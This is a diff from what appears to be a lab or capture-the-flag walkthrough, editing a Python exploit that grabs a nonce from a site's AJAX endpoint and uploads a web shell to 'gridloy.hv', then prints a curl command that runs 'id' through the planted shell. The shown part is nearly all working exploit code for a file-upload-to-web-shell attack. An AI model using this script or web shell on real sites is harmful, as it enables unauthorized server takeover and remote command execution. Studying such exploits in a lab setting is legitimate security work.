@@ -81,11 +81,28 @@ def upload_shell(target, nonce):
     r = requests.post(ajax, data=data, files=files, verify=False)
     return json.loads(r.text)["data"]["url"] if r.status_code == 200 else None
 
-nonce = get_nonce("http://gridloy.hv")
-shell = upload_shell("http://gridloy.hv", nonce)
-print(shell)
-```
+# Ana işlem
+target = "http://gridloy.hv"
+print("[*] Nonce değeri alınıyor...")
+nonce = get_nonce(target)
 
+if not nonce:
+    print("[-] Nonce bulunamadı!")
+    sys.exit(1)
+
+print(f"[+] Nonce bulundu: {nonce}")
+print("[*] Web shell yükleniyor...")
+
+shell_url = upload_shell(target, nonce)
+
+if shell_url:
+    print(f"[+] Web shell başarıyla yüklendi!")
+    print(f"[+] Shell URL: {shell_url}")
+    print(f"\n[+] Test komutu:")
+    print(f"curl -s \"{shell_url}?cmd=id\"")
+else:
+    print("[-] Shell yükleme başarısız!")
+```
 
 I then pasted the exploit code into the file and saved it (`Ctrl + X`, `Y`, `Enter`).
 
